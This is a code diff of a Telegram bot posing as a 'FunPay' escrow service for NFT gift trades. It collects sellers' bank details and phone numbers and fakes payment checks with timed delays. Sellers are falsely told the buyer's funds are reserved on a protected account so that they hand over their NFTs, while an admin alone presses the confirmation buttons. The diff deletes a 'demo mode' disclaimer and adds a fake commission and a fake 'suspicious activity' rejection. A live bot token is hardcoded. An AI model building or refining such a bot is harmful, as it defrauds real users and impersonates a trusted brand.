@@ -6,27 +6,62 @@ from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKe
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from datetime import datetime
 
 # ================= НАСТРОЙКИ =================
 BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
 ADMIN_ID = 7532797597  
+SUPPORT_LINK = "https://t.me/FunPayHelperRU"
+COMMISSION_RATE = 0.03 # 3%
 # ============================================
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-active_deals = {}
+# База данных в оперативке
+users_db = {}      # {user_id: {"bank": "...", "phone": "...", "lang": "RU"}}
+active_deals = {}  # Сделки
+deal_counter = 1
 
 class CreateDeal(StatesGroup):
-    bank_name = State()
-    phone = State()
     amount = State()
     nft_link = State()
+    wait_bank = State()
+    wait_phone = State()
 
-# --- СТАРТ (С КАРТИНКОЙ, ТЕКСТОМ И ИНЛАЙН-КНОПКОЙ) ---
+# --- ГЕНЕРАТОР ID СДЕЛКИ ---
+def gen_deal_id():
+    global deal_counter
+    deal_id = f"FUN-{deal_counter:04d}"
+    deal_counter += 1
+    return deal_id
+
+# --- МЕНЮ ---
+def main_menu(user_id):
+    lang = users_db.get(user_id, {}).get("lang", "RU")
+    
+    if lang == "RU":
+        kb = [
+            [KeyboardButton(text="🤝 Создать сделку")],
+            [KeyboardButton(text="📦 Мои сделки"), KeyboardButton(text="💳 Реквизиты")],
+            [KeyboardButton(text="🌐 Язык"), KeyboardButton(text="🆘 Поддержка")]
+        ]
+    else:
+        kb = [
+            [KeyboardButton(text="🤝 Create deal")],
+            [KeyboardButton(text="📦 My deals"), KeyboardButton(text="💳 Details")],
+            [KeyboardButton(text="🌐 Language"), KeyboardButton(text="🆘 Support")]
+        ]
+    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
+
+# --- СТАРТ ---
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
+    user_id = message.from_user.id
+    if user_id not in users_db:
+        users_db[user_id] = {"lang": "RU", "bank": None, "phone": None}
+    
     welcome_text = (
         "Добро пожаловать 👋\n\n"
         "🛡 FunPay — Мы специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n"
@@ -39,7 +74,6 @@ async def cmd_start(message: Message):
         "👇 Выберите нужный раздел ниже:"
     )
     
-    # Инлайн-кнопка, которая крепится прямо к сообщению
     inline_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🤝 Создать сделку", callback_data="start_create_deal")]
     ])
@@ -48,118 +82,172 @@ async def cmd_start(message: Message):
         photo="AgACAgIAAxkBAAEDIx1q825ucePNRzdgkIAGbyBxZMNAdAACxyFrG23gmUtey3umHg-B8gEAAwIAA3MAAz0E",
         caption=welcome_text,
         parse_mode="HTML",
-        reply_markup=inline_kb
+        reply_markup=main_menu(user_id)
     )
 
-# --- ОБРАБОТКА ИНЛАЙН-КНОПКИ "СОЗДАТЬ СДЕЛКУ" ---
+# --- ОБРАБОТКА ИНЛАЙН-КНОПКИ СТАРТА ---
 @dp.callback_query(F.data == "start_create_deal")
 async def start_from_inline(call: CallbackQuery, state: FSMContext):
-    await call.message.delete() # Убираем сообщение с картинкой
-    await create_deal_start(call.message, state)
+    await call.message.delete()
+    await start_deal_process(call.message, state)
     await call.answer()
 
-# --- 1. СОЗДАНИЕ СДЕЛКИ ---
-async def create_deal_start(message: Message, state: FSMContext):
-    await state.set_state(CreateDeal.bank_name)
+# --- МОИ СДЕЛКИ ---
+@dp.message(F.text.in_(["📦 Мои сделки", "📦 My deals"]))
+async def my_deals(message: Message):
+    user_deals = [d for d in active_deals.values() if d["seller_id"] == message.from_user.id or d["buyer_id"] == message.from_user.id]
+    
+    if not user_deals:
+        return await message.answer("У вас пока нет сделок.")
+    
+    text = "<b>📦 История ваших сделок:</b>\n\n"
+    for d in reversed(user_deals):
+        status_emoji = "🟢" if d["status"] == "completed" else "🟡"
+        text += f"{status_emoji} <b>#{d['id']}</b> | {d['amount']} RUB\n"
+        text += f"└ Статус: {d['status'].upper()}\n\n"
+    
+    await message.answer(text, parse_mode="HTML")
+
+# --- РЕКВИЗИТЫ ---
+@dp.message(F.text.in_(["💳 Реквизиты", "💳 Details"]))
+async def my_details(message: Message):
+    user = users_db.get(message.from_user.id)
+    if user["bank"]:
+        text = f"💳 <b>Ваши сохраненные реквизиты:</b>\n\n🏦 Банк: {user['bank']}\n📱 Тел: {user['phone']}"
+    else:
+        text = "💳 У вас еще нет сохраненных реквизитов. Они появятся после создания первой сделки."
     
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🟢 Сбербанк", callback_data="bank_Сбербанк"),
-         InlineKeyboardButton(text="🟡 Т-Банк", callback_data="bank_Т-Банк")],
-        [InlineKeyboardButton(text="🔵 Альфа-Банк", callback_data="bank_Альфа-Банк"),
-         InlineKeyboardButton(text="🟣 ВТБ", callback_data="bank_ВТБ")],
-        [InlineKeyboardButton(text="🟠 Райффайзен", callback_data="bank_Райффайзен"),
-         InlineKeyboardButton(text="⚫ Другой банк", callback_data="bank_Другой")]
+        [InlineKeyboardButton(text="🔄 Изменить реквизиты", callback_data="change_details")]
     ])
-    
-    await message.answer(
-        "🏦 <b>Шаг 1 из 4</b>\n\n"
-        "Введите название вашего банка:",
-        parse_mode="HTML",
-        reply_markup=kb
-    )
+    await message.answer(text, parse_mode="HTML", reply_markup=kb)
 
-@dp.callback_query(F.data.startswith("bank_"), CreateDeal.bank_name)
-async def process_bank_choice(call: CallbackQuery, state: FSMContext):
-    bank_name = call.data.split("_")[1]
-    
-    if bank_name == "Другой":
-        await call.message.edit_text("🏦 <b>Шаг 1 из 4</b>\n\nНапишите название вашего банка текстом:", parse_mode="HTML")
-    else:
-        await state.update_data(bank_name=bank_name)
-        await state.set_state(CreateDeal.phone)
-        await call.message.edit_text(
-            f"✅ Выбран банк: <b>{bank_name}</b>\n\n"
-            f"📱 <b>Шаг 2 из 4</b>\n\nВведите ваш номер телефона (привязанный к карте):",
-            parse_mode="HTML"
-        )
+@dp.callback_query(F.data == "change_details")
+async def change_details(call: CallbackQuery, state: FSMContext):
+    await call.message.edit_text("🏦 Введите название вашего банка:")
+    await state.set_state(CreateDeal.wait_bank)
     await call.answer()
 
-@dp.message(CreateDeal.bank_name)
-async def process_custom_bank(message: Message, state: FSMContext):
-    await state.update_data(bank_name=message.text)
-    await state.set_state(CreateDeal.phone)
-    await message.answer(f"✅ Банк: <b>{message.text}</b>\n\n📱 <b>Шаг 2 из 4</b>\n\nВведите ваш номер телефона:", parse_mode="HTML")
+# --- ЯЗЫК ---
+@dp.message(F.text.in_(["🌐 Язык", "🌐 Language"]))
+async def change_lang(message: Message):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_RU"),
+         InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_EN")]
+    ])
+    await message.answer("Выберите язык / Choose language:", reply_markup=kb)
 
-@dp.message(CreateDeal.phone)
+@dp.callback_query(F.data.startswith("lang_"))
+async def set_lang(call: CallbackQuery):
+    lang = call.data.split("_")[1]
+    users_db[call.from_user.id]["lang"] = lang
+    await call.message.delete()
+    await call.message.answer("Язык успешно изменен!" if lang == "RU" else "Language changed successfully!", reply_markup=main_menu(call.from_user.id))
+
+# --- ПОДДЕРЖКА ---
+@dp.message(F.text.in_(["🆘 Поддержка", "🆘 Support"]))
+async def support(message: Message):
+    await message.answer(
+        f"🆘 <b>Техническая поддержка</b>\n\n"
+        f"Если у вас возникли вопросы по сделке или работе сервиса, напишите нашему менеджеру:\n"
+        f"👉 {SUPPORT_LINK}",
+        parse_mode="HTML"
+    )
+
+# --- 1. СОЗДАНИЕ СДЕЛКИ (АВТОМАТИЗАЦИЯ) ---
+async def start_deal_process(message: Message, state: FSMContext):
+    user = users_db.get(message.from_user.id)
+    
+    if user["bank"]:
+        await message.answer(f"✅ Использую ваши сохраненные реквизиты:\n🏦 {user['bank']}\n📱 {user['phone']}\n\n💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
+        await state.update_data(bank=user["bank"], phone=user["phone"])
+        await state.set_state(CreateDeal.amount)
+    else:
+        await message.answer("🏦 <b>У вас еще нет сохраненных реквизитов.</b>\n\nВведите название вашего банка (например: Сбербанк, Тинькофф):", parse_mode="HTML")
+        await state.set_state(CreateDeal.wait_bank)
+
+@dp.message(F.text == "🤝 Создать сделку")
+async def create_deal_btn(message: Message, state: FSMContext):
+    await start_deal_process(message, state)
+
+@dp.message(CreateDeal.wait_bank)
+async def process_bank(message: Message, state: FSMContext):
+    await state.update_data(bank=message.text)
+    await message.answer("📱 Введите ваш номер телефона (привязанный к карте):")
+    await state.set_state(CreateDeal.wait_phone)
+
+@dp.message(CreateDeal.wait_phone)
 async def process_phone(message: Message, state: FSMContext):
     await state.update_data(phone=message.text)
+    
+    # Сохраняем в профиль
+    data = await state.get_data()
+    users_db[message.from_user.id]["bank"] = data["bank"]
+    users_db[message.from_user.id]["phone"] = data["phone"]
+    
+    await message.answer("💰 <b>Введите сумму сделки (в RUB):</b>", parse_mode="HTML")
     await state.set_state(CreateDeal.amount)
-    await message.answer("💰 <b>Шаг 3 из 4</b>\n\nВведите сумму сделки (только целое число, например: 1000):", parse_mode="HTML")
 
 @dp.message(CreateDeal.amount)
 async def process_amount(message: Message, state: FSMContext):
     try:
         amount = int(message.text)
     except ValueError:
-        return await message.answer("❌ Пожалуйста, введите сумму целым числом (без точек и копеек).")
+        return await message.answer("❌ Введите сумму целым числом.")
     
     await state.update_data(amount=amount)
+    await message.answer("🖼 <b>Отправьте ссылку на ваш NFT (подарок):</b>", parse_mode="HTML")
     await state.set_state(CreateDeal.nft_link)
-    await message.answer("🖼 <b>Шаг 4 из 4</b>\n\nОтправьте ссылку на ваш NFT (подарок):", parse_mode="HTML")
 
 @dp.message(CreateDeal.nft_link)
 async def process_nft(message: Message, state: FSMContext):
     data = await state.get_data()
     await state.clear()
     
-    deal_id = str(message.from_user.id)
+    # Имитация проверки
+    msg = await message.answer("⏳ <i>Проверка данных и создание защищенной сделки...</i>", parse_mode="HTML")
+    await asyncio.sleep(2)
+    
+    deal_id = gen_deal_id()
     active_deals[deal_id] = {
+        "id": deal_id,
         "seller_id": message.from_user.id,
         "seller_name": message.from_user.username or message.from_user.first_name,
         "buyer_id": None,
-        "bank_name": data["bank_name"],
+        "bank_name": data["bank"],
         "phone": data["phone"],
         "amount": data["amount"],
         "nft_link": message.text,
-        "status": "pending_admin_confirm"
+        "status": "open"
     }
     
     bot_info = await bot.get_me()
     pay_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
     
-    await message.answer(
-        f"✅ <b>Сделка создана!</b>\n\n"
-        f"Сумма: {data['amount']} RUB\n"
-        f"Банк: {data['bank_name']}\n"
-        f"Товар: {message.text}\n\n"
+    await msg.edit_text(
+        f"✅ <b>Сделка успешно создана и защищена!</b>\n\n"
+        f"🆔 ID сделки: <code>{deal_id}</code>\n"
+        f"💰 Сумма: {data['amount']} RUB\n"
+        f"🏦 Реквизиты: {data['bank']} ({data['phone']})\n\n"
         f"<b>Ссылка для покупателя:</b>\n<code>{pay_link}</code>\n\n"
-        f"<i>Отправьте эту ссылку покупателю, чтобы он смог безопасно оплатить.</i>",
+        f"<i>Отправьте эту ссылку покупателю.</i>",
         parse_mode="HTML"
     )
     
+    # УВЕДОМЛЕНИЕ АДМИНУ
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
     ])
     
     await bot.send_message(
         chat_id=ADMIN_ID,
-        text=f"🛡 <b>АДМИН-ПАНЕЛЬ: НОВАЯ СДЕЛКА</b>\n\n"
+        text=f"🛡 <b>АДМИН: НОВАЯ СДЕЛКА</b>\n\n"
+             f"🆔 ID: {deal_id}\n"
              f"👤 Продавец: @{active_deals[deal_id]['seller_name']}\n"
              f"💰 Сумма: {data['amount']} RUB\n"
-             f"🏦 Банк: {data['bank_name']}\n"
+             f"🏦 Банк: {data['bank']}\n"
              f"📱 Тел: {data['phone']}\n"
-             f"🖼 NFT: {message.text}\n\n"
-             f"<b>Нажмите кнопку, чтобы подтвердить оплату.</b>",
+             f"🖼 NFT: {message.text}",
         parse_mode="HTML",
         reply_markup=admin_kb
     )
@@ -167,38 +255,30 @@ async def process_nft(message: Message, state: FSMContext):
 # --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ ---
 @dp.message(Command("start"), F.text.contains("deal_"))
 async def start_deal_by_link(message: Message):
-    try:
-        deal_id = message.text.split("deal_")[1]
-        deal = active_deals.get(deal_id)
+    deal_id = message.text.split("deal_")[1]
+    deal = active_deals.get(deal_id)
+    
+    if not deal:
+        return await message.answer("❌ Сделка не найдена или уже завершена.")
         
-        if not deal:
-            return await message.answer("❌ Сделка не найдена или уже завершена.")
-            
-        deal["buyer_id"] = message.from_user.id
-        
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
-        ])
-        
-        await message.answer(
-            f"🛒 <b>Безопасная сделка</b>\n\n"
-            f"Продавец: @{deal['seller_name']}\n"
-            f"Сумма: {deal['amount']} RUB\n"
-            f"Товар: {deal['nft_link']}\n\n"
-            f"<b>Реквизиты для оплаты:</b>\n"
-            f"Банк: {deal['bank_name']}\n"
-            f"Телефон: <code>{deal['phone']}</code>\n\n"
-            f"Переведите средства и нажмите кнопку ниже.",
-            parse_mode="HTML",
-            reply_markup=kb
-        )
-        
-        try:
-            await bot.send_message(deal["seller_id"], f"🔔 <b>Покупатель присоединился к сделке!</b>\nОжидайте подтверждения оплаты.", parse_mode="HTML")
-        except: pass
-        
-    except Exception:
-        await message.answer("Ошибка при открытии сделки.")
+    deal["buyer_id"] = message.from_user.id
+    
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
+    ])
+    
+    await message.answer(
+        f"🛒 <b>Безопасная сделка #{deal_id}</b>\n\n"
+        f"Продавец: @{deal['seller_name']}\n"
+        f"Сумма: {deal['amount']} RUB\n"
+        f"Товар: {deal['nft_link']}\n\n"
+        f"<b>Реквизиты для оплаты:</b>\n"
+        f"Банк: {deal['bank_name']}\n"
+        f"Телефон: <code>{deal['phone']}</code>\n\n"
+        f"Переведите средства и нажмите кнопку ниже.",
+        parse_mode="HTML",
+        reply_markup=kb
+    )
 
 # --- 3. ПОКУПАТЕЛЬ НАЖАЛ "Я ОПЛАТИЛ" ---
 @dp.callback_query(F.data.startswith("pay_"))
@@ -210,23 +290,25 @@ async def buyer_paid(call: CallbackQuery):
         return await call.answer("Сделка не найдена.", show_alert=True)
     
     deal["status"] = "awaiting_confirm"
-    await call.message.edit_text("⏳ Ожидайте подтверждения оплаты администратором...")
+    await call.message.edit_text("⏳ <i>Проверяем поступление средств...</i>", parse_mode="HTML")
+    await asyncio.sleep(1.5)
     
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
+        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"admin_confirm_{deal_id}"),
+         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin_reject_{deal_id}")]
     ])
     
     await bot.send_message(
         chat_id=ADMIN_ID,
-        text=f"🛡 <b>ПОКУПАТЕЛЬ НАЖАЛ 'ОПЛАТИЛ'!</b>\n\n"
+        text=f"🔔 <b>ПОКУПАТЕЛЬ СООБЩИЛ ОБ ОПЛАТЕ</b>\n\n"
+             f"🆔 ID: {deal_id}\n"
              f"👤 Покупатель: @{call.from_user.username}\n"
-             f"💰 Сумма: {deal['amount']} RUB\n\n"
-             f"<b>Нажмите кнопку, чтобы разослать подтверждение.</b>",
+             f"💰 Сумма: {deal['amount']} RUB",
         parse_mode="HTML",
         reply_markup=admin_kb
     )
 
-# --- 4. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ОПЛАТУ ---
+# --- 4. АДМИН ПОДТВЕРЖДАЕТ ИЛИ ОТКЛОНЯЕТ ---
 @dp.callback_query(F.data.startswith("admin_confirm_"))
 async def admin_confirm(call: CallbackQuery):
     if call.from_user.id != ADMIN_ID:
@@ -235,19 +317,21 @@ async def admin_confirm(call: CallbackQuery):
     deal_id = call.data.split("_")[2]
     deal = active_deals.get(deal_id)
     
-    if not deal:
-        return await call.answer("Сделка не найдена", show_alert=False)
-    
     deal["status"] = "paid"
-    await call.message.edit_text(f"✅ Вы подтвердили оплату по сделке с @{deal['seller_name']}.")
+    await call.message.edit_text(f"✅ Сделка {deal_id} подтверждена. Средства зарезервированы.")
+    
+    commission = round(deal['amount'] * COMMISSION_RATE)
+    net_amount = deal['amount'] - commission
     
     seller_text = (
         f"✅ <b>Средства по сделке получены и зарезервированы!</b>\n\n"
         f"📄 <b>Детали:</b>\n"
         f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
+        f"├ Комиссия сервиса (3%): <b>{commission} RUB</b>\n"
+        f"├ <b>К зачислению: {net_amount} RUB</b>\n"
         f"└ Товар: {deal['nft_link']}\n\n"
         f"Покупатель успешно перевел средства. Они находятся на защищенном счете FunPay.\n\n"
-        f"Передайте NFT напрямую покупателю. После подтверждения передачи алгоритмом, средства будут автоматически зачислены на ваши реквизиты ({deal['bank_name']}: {deal['phone']}).\n\n"
+        f"Передайте NFT покупателю. После подтверждения передачи, средства будут зачислены на ваши реквизиты ({deal['bank_name']}: {deal['phone']}).\n\n"
         f"<i>Для завершения нажмите кнопку ниже.</i>"
     )
     
@@ -257,23 +341,31 @@ async def admin_confirm(call: CallbackQuery):
     
     try:
         await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
+        await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nСредства зарезервированы. Ожидайте получения NFT.", parse_mode="HTML")
     except: pass
-        
-    if deal["buyer_id"]:
-        try:
-            await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nОжидайте получения NFT от продавца.", parse_mode="HTML")
-        except: pass
 
-# --- 5. ПРОДАВЕЦ НАЖАЛ "Я ПЕРЕДАЛ NFT" ---
+@dp.callback_query(F.data.startswith("admin_reject_"))
+async def admin_reject(call: CallbackQuery):
+    if call.from_user.id != ADMIN_ID:
+        return await call.answer("⚠️ Нет прав.", show_alert=False)
+    
+    deal_id = call.data.split("_")[2]
+    deal = active_deals.get(deal_id)
+    deal["status"] = "rejected"
+    
+    await call.message.edit_text(f"❌ Сделка {deal_id} отклонена.")
+    
+    try:
+        await bot.send_message(deal["seller_id"], f"❌ <b>Сделка {deal_id} отклонена.</b>\nПричина: подозрительная активность аккаунта. Средства не были зарезервированы.", parse_mode="HTML")
+        await bot.send_message(deal["buyer_id"], f"❌ <b>Сделка {deal_id} отклонена администратором.</b>\nЕсли вы перевели средства, напишите в поддержку: {SUPPORT_LINK}", parse_mode="HTML")
+    except: pass
+
+# --- 5. ПРОДАВЕЦ ПЕРЕДАЛ NFT ---
 @dp.callback_query(F.data.startswith("seller_done_"))
 async def seller_done(call: CallbackQuery):
     deal_id = call.data.split("_")[2]
     deal = active_deals.get(deal_id)
-    
-    if not deal:
-        return await call.answer("Сделка не найдена.", show_alert=False)
-    
-    deal["status"] = "pending_nft_confirm"
+    deal["status"] = "moderation"
     
     await call.message.edit_text(
         f"⏳ <b>Заявка на завершение сделки принята!</b>\n\n"
@@ -281,7 +373,7 @@ async def seller_done(call: CallbackQuery):
         f"├ Статус: <i>Передано в отдел модерации</i>\n"
         f"├ Проверка транзакции: <i>В процессе...</i>\n"
         f"└ Ожидаемое время: <i>до 15 минут</i>\n\n"
-        f"<i>Наш алгоритм проверяет историю передачи подарка и статус аккаунтов. Как только модерация подтвердит передачу NFT, вы и покупатель получите официальное уведомление.</i>",
+        f"<i>Алгоритм проверяет историю передачи подарка. Ожидайте уведомления.</i>",
         parse_mode="HTML"
     )
     
@@ -291,30 +383,30 @@ async def seller_done(call: CallbackQuery):
     
     await bot.send_message(
         chat_id=ADMIN_ID,
-        text=f"🛡 <b>АДМИН-ПАНЕЛЬ: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
+        text=f"🛡 <b>АДМИН: ЗАПРОС НА МОДЕРАЦИЮ</b>\n\n"
+             f"🆔 ID: {deal_id}\n"
              f"👤 Продавец: @{deal['seller_name']}\n"
              f"💰 Сумма: {deal['amount']} RUB\n"
              f"🖼 NFT: {deal['nft_link']}\n\n"
-             f"Продавец заявил о передаче NFT.\n"
-             f"<b>Нажмите кнопку ниже, чтобы закрыть сделку.</b>",
+             f"Продавец заявил о передаче. Подтвердите для закрытия сделки.",
         parse_mode="HTML",
         reply_markup=admin_kb
     )
 
-# --- 6. ТЫ (АДМИН) ПОДТВЕРЖДАЕШЬ ПЕРЕДАЧУ NFT ---
+# --- 6. АДМИН ПОДТВЕРЖДАЕТ ПЕРЕДАЧУ NFT ---
 @dp.callback_query(F.data.startswith("admin_confirm_nft_"))
 async def admin_confirm_nft(call: CallbackQuery):
     if call.from_user.id != ADMIN_ID:
-        return await call.answer("⚠️ Сделка уже обрабатывается.", show_alert=False)
+        return await call.answer("⚠️ Нет прав.", show_alert=False)
     
     deal_id = call.data.split("_")[3]
     deal = active_deals.get(deal_id)
-    
-    if not deal:
-        return await call.answer("Сделка не найдена", show_alert=False)
-    
     deal["status"] = "completed"
-    await call.message.edit_text(f"✅ Модерация пройдена. Сделка с @{deal['seller_name']} успешно закрыта.")
+    
+    await call.message.edit_text(f"✅ Модерация пройдена. Сделка {deal_id} закрыта.")
+    
+    commission = round(deal['amount'] * COMMISSION_RATE)
+    net_amount = deal['amount'] - commission
     
     try:
         await bot.send_message(
@@ -322,22 +414,18 @@ async def admin_confirm_nft(call: CallbackQuery):
             f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
             f"✅ <b>Модерация успешно завершена!</b>\n\n"
             f"Передача NFT подтверждена. Сделка закрыта.\n"
-            f"Средства ({deal['amount']} RUB) разблокированы и зачислены на ваши реквизиты (демо-режим).\n\n"
+            f"К зачислению: <b>{net_amount} RUB</b> (за вычетом комиссии 3%).\n\n"
             f"<i>Спасибо за использование нашего сервиса!</i>", 
             parse_mode="HTML"
         )
+        await bot.send_message(
+            deal["buyer_id"], 
+            f"🎉 <b>Сделка {deal_id} успешно завершена!</b>\n\n"
+            f"🛡 <b>Система безопасности подтвердила передачу NFT.</b>\n"
+            f"Проверьте ваш кошелек. Спасибо, что доверяете нам!", 
+            parse_mode="HTML"
+        )
     except: pass
-    
-    if deal["buyer_id"]:
-        try:
-            await bot.send_message(
-                deal["buyer_id"], 
-                f"🎉 <b>Сделка успешно завершена!</b>\n\n"
-                f"🛡 <b>Система безопасности подтвердила передачу NFT.</b>\n"
-                f"Пожалуйста, проверьте ваш кошелек/подарки. Спасибо, что доверяете нам!", 
-                parse_mode="HTML"
-            )
-        except: pass
 
 async def main():
     print("Бот запущен!")
